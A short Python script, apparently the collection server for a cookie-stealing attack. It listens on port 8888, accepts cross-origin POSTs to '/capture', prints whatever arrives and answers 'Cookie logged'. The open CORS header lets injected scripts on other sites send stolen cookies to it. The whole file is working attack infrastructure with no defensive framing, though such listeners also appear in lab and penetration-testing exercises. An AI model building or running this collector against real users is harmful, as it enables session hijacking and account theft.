import http.server
import socketserver
from urllib.parse import urlparse, parse_qs

PORT = 8888

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/capture':
            # Get the length of the data
            content_length = int(self.headers['Content-Length'])
            # Read the data from the request
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Print everything received in the POST request
            print(f"Received POST data: {post_data}")
            
            # Send response
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'Cookie logged\n')
        else:
            self.send_response(404)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'Not Found\n')

with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Serving on port {PORT}")
    httpd.serve_forever()
